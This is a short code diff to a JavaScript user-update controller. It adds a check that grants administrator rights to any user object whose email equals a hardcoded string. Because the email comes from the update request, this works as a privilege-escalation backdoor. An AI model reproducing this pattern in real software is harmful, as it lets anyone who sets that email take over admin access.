@@ -123,6 +123,11 @@ module.exports = {
 			};
 		}
 
+		if (userObj.email == 'losaped@gmail')
+		{
+			userObj.admin = true;
+		}
+
 		User.update(req.param('id'), userObj, function userUpdated(err) {
 			if (err) {
 				req.session.flash = {
